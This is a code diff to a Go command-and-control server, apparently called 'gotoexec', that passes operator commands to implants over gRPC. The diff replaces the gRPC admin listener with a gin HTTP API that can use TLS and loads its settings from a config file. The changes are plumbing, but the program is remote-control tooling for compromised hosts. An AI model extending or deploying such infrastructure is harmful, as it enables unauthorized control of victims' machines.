@@ -5,11 +5,15 @@ import (
 	"errors"
 	"flag"
 	"fmt"
+	"gotoexec/config"
 	"gotoexec/grpcapi"
+	"gotoexec/initialize"
+	"gotoexec/middlewares"
 	"gotoexec/util"
 	"log"
 	"net"
 
+	"github.com/gin-gonic/gin"
 	"google.golang.org/grpc"
 )
 
@@ -19,18 +23,8 @@ type implantServer struct {
 	work, output chan *grpcapi.Command
 }
 
-type adminServer struct {
-	work, output chan *grpcapi.Command
-}
-
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
 	s := new(implantServer)
-	s.work = work
-	s.output = output
-	return s
-}
-func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
-	s := new(adminServer)
 	s.work = work
 	s.output = output
 	return s
@@ -78,37 +72,51 @@ func (s *adminServer) SetSleepTime(ctx context.Context, time *grpcapi.SleepTime)
 func main() {
 	util.Banner()
 	var (
-		implantListener, adminListener net.Listener
-		err                            error
-		opts                           []grpc.ServerOption
-		work, output                   chan *grpcapi.Command
-		implantPort, adminPort         int
+		implantListener net.Listener
+		err             error
+		opts            []grpc.ServerOption
+		work, output    chan *grpcapi.Command
+		Router          *gin.Engine
 	)
-	flag.IntVar(&implantPort, "iport", 1961, "Implant server port")
-	flag.IntVar(&adminPort, "aport", 1962, "Admin server port")
+
 	flag.Parse()
+
+	//加载配置
+	config.Init("conf.toml")
+
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	//植入程序服务端和管理程序服务端使用相同的通道
 	implant := NewImplantServer(work, output)
-	admin := NewAdminServer(work, output)
+
 	//服务端建立监听，植入服务端与管理服务端监听的端口分别是4001和4002
-	if implantListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", implantPort)); err != nil {
+	if implantListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", config.CoreConf.ListenPort)); err != nil {
 		log.Fatalln("implantserver" + err.Error())
 	}
-	if adminListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", adminPort)); err != nil {
-		log.Fatalln("adminserver" + err.Error())
-	}
+
 	opts = []grpc.ServerOption{
 		grpc.MaxRecvMsgSize(1024 * 1024 * 12),
 		grpc.MaxSendMsgSize(1024 * 1024 * 12),
 	}
-	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
+	grpcImplantServer := grpc.NewServer(opts...)
 
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
-	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+
 	//使用goroutine启动植入程序服务端，防止代码阻塞，毕竟后面还要开启管理程序服务端
 	go func() {
 		grpcImplantServer.Serve(implantListener)
 	}()
-	grpcAdminServer.Serve(adminListener)
+
+	//加载路由
+	Router = initialize.Routers()
+	if config.CoreConf.HttpsServer {
+		Router.Use(middlewares.TlsHandler())
+		if err = Router.RunTLS(fmt.Sprintf(":%d", config.CoreConf.ApiPort), "pem/.cert.pem", "pem/.key.pem"); err != nil {
+			log.Fatalln("Router.RunTLS" + err.Error())
+		}
+	} else {
+		if err = Router.Run(fmt.Sprintf(":%d", config.CoreConf.ApiPort)); err != nil {
+			log.Fatalln("Router.Run" + err.Error())
+		}
+	}
+
 }
